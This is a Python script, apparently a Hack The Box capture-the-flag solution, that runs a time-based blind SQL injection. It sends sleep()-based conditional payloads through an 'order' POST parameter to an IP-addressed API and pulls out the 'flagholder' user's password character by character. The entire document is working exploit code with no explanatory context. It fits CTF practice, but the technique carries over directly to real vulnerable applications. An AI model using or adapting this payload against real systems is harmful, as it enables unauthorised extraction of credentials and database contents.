url = 'http://188.166.173.208:30042/api/list'

import requests, string, time
arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
s = requests.session()
def bind(step):
    for char in arr:
        a = time.time()
        s.post(url,data={'order':f"(select case when (select ascii(mid((select password from users  where username='flagholder'),{step},1))) LIKE {ord(char)} then sleep(0.6) else 1 end)"})
        b = time.time()
        if b-a > 4:
            return char
    return None        

def flag():
    flag = 'HTB{'
    step = len(flag) + 1 
    while True:
        c = bind(step)
        if c==None or c=='}':
            return flag + c
            
        flag += c 
        step += 1
        print('[+] flag = ',flag)

print('[+] flag = ',flag())
